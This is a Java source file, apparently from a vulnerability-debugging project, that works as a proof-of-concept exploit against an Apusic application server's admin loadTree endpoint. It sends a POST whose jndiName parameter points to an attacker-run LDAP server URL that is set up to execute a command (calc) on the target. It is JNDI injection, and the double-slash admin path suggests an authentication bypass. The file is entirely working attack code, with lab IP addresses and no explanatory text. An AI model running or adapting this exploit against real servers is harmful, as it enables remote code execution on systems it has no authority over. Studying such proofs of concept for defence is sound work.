package apusic;

import com.apusic.util.FileUtil;
import com.apusic.web.servlet.FileServlet;
import com.apusic.web.servlet.InvokerServlet;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import javax.naming.InitialContext;
import java.io.IOException;

public class loadTree_jndi {

    public static void main(String[] args) throws IOException {

        String url = "http://192.168.26.129:6888/admin//protect/jndi/loadTree";
        String jndiUrl = "ldap://192.168.26.129:11389/Basic/Command/calc";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        String body = "jndiName=" + jndiUrl;
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
    }
}
